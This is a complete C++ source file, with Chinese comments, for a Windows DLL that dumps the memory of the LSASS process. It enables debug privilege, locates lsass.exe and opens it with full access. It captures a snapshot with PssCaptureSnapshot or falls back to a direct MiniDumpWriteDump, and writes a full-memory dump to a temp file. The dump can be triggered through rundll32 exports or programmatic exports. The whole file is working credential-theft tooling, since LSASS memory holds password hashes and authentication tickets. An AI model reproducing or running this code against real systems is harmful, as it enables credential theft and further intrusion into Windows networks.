#include "pch.h"
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <processsnapshot.h>
#include <string>
#include <sstream>

#pragma comment (lib, "Dbghelp.lib")

// 全局变量用于存储输出信息
std::wstring g_output;

// 输出日志函数
void Log(const std::wstring& message)
{
    g_output += message + L"\n";
    OutputDebugStringW(message.c_str());
}

// MiniDump 回调函数
BOOL CALLBACK MyMiniDumpWriteDumpCallback(
    __in     PVOID CallbackParam,
    __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
    __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
    switch (CallbackInput->CallbackType)
    {
    case 16: // IsProcessSnapshotCallback
        CallbackOutput->Status = S_FALSE;
        break;
    }
    return TRUE;
}

// 启用调试权限
BOOL EnableDebugPrivilege()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
    {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

// 核心 dump 函数
BOOL DumpLsass(LPCWSTR outputPath = NULL)
{
    Log(L"[*] Starting LSASS dump process...");

    // 启用权限
    if (!EnableDebugPrivilege())
    {
        Log(L"[-] Failed to enable debug privilege");
        return FALSE;
    }

    // 查找 lsass.exe
    DWORD lsassPID = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
    {
        Log(L"[-] Failed to create process snapshot");
        return FALSE;
    }

    PROCESSENTRY32W processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    BOOL foundLsass = FALSE;
    if (Process32FirstW(snapshot, &processEntry))
    {
        do
        {
            if (_wcsicmp(processEntry.szExeFile, L"lsass.exe") == 0)
            {
                lsassPID = processEntry.th32ProcessID;
                foundLsass = TRUE;
                std::wstringstream ss;
                ss << L"[+] Found lsass.exe PID: " << lsassPID;
                Log(ss.str());
                break;
            }
        } while (Process32NextW(snapshot, &processEntry));
    }

    CloseHandle(snapshot);

    if (!foundLsass)
    {
        Log(L"[-] Failed to find lsass.exe process");
        return FALSE;
    }

    // 打开 lsass 进程
    HANDLE lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPID);
    if (lsassHandle == NULL)
    {
        std::wstringstream ss;
        ss << L"[-] Failed to open lsass.exe. Error: " << GetLastError();
        Log(ss.str());
        return FALSE;
    }

    // 确定输出文件路径
    std::wstring dumpPath;
    if (outputPath != NULL && wcslen(outputPath) > 0)
    {
        dumpPath = outputPath;
    }
    else
    {
        // 默认保存到临时目录
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        dumpPath = std::wstring(tempPath) + L"lsass_" + std::to_wstring(GetTickCount()) + L".dmp";
    }

    // 创建输出文件
    HANDLE outFile = CreateFileW(dumpPath.c_str(), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (outFile == INVALID_HANDLE_VALUE)
    {
        Log(L"[-] Failed to create dump file");
        CloseHandle(lsassHandle);
        return FALSE;
    }

    Log(L"[*] Attempting to dump LSASS...");

    // 尝试方法1：使用 PssCaptureSnapshot
    HPSS snapshotHandle = NULL;
    DWORD flags = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES |
        PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION |
        PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE |
        PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED |
        PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL |
        PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;

    BOOL dumpSuccess = FALSE;
    DWORD result = PssCaptureSnapshot(lsassHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, &snapshotHandle);

    if (result == ERROR_SUCCESS)
    {
        MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
        ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
        CallbackInfo.CallbackRoutine = &MyMiniDumpWriteDumpCallback;
        CallbackInfo.CallbackParam = NULL;

        dumpSuccess = MiniDumpWriteDump(snapshotHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
        PssFreeSnapshot(GetCurrentProcess(), snapshotHandle);
    }
    else
    {
        // 方法2：直接使用 MiniDumpWriteDump
        Log(L"[*] PssCaptureSnapshot failed, trying direct method...");
        dumpSuccess = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    }

    if (dumpSuccess)
    {
        Log(L"[+] LSASS dumped successfully!");
        Log(L"[+] Dump file: " + dumpPath);
    }
    else
    {
        std::wstringstream ss;
        ss << L"[-] Failed to dump LSASS. Error: " << GetLastError();
        Log(ss.str());
    }

    // 清理资源
    CloseHandle(outFile);
    CloseHandle(lsassHandle);

    return dumpSuccess;
}

// 导出函数1：供 rundll32 调用
extern "C" __declspec(dllexport) void CALLBACK DumpLsassW(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
{
    // 解析命令行参数作为输出路径
    std::wstring outputPath;
    if (lpszCmdLine && wcslen(lpszCmdLine) > 0)
    {
        outputPath = lpszCmdLine;
    }

    BOOL success = DumpLsass(outputPath.empty() ? NULL : outputPath.c_str());

    // 显示结果消息框
    if (nCmdShow == SW_SHOW)
    {
        MessageBoxW(hwnd, g_output.c_str(), L"LSASS Dump Result", success ? MB_OK : MB_OK | MB_ICONERROR);
    }
}

// 导出函数2：供 rundll32 调用（ANSI版本）
extern "C" __declspec(dllexport) void CALLBACK DumpLsassA(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    // 转换 ANSI 到 Unicode
    std::wstring outputPath;
    if (lpszCmdLine && strlen(lpszCmdLine) > 0)
    {
        int len = MultiByteToWideChar(CP_ACP, 0, lpszCmdLine, -1, NULL, 0);
        if (len > 0)
        {
            outputPath.resize(len);
            MultiByteToWideChar(CP_ACP, 0, lpszCmdLine, -1, &outputPath[0], len);
        }
    }

    DumpLsassW(hwnd, hinst, outputPath.empty() ? NULL : &outputPath[0], nCmdShow);
}

// 导出函数3：供编程调用
extern "C" __declspec(dllexport) BOOL DumpLsassToFile(LPCWSTR outputPath)
{
    return DumpLsass(outputPath);
}

// 导出函数4：无参数版本
extern "C" __declspec(dllexport) BOOL DumpLsassDefault()
{
    return DumpLsass(NULL);
}

// DLL 入口点
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
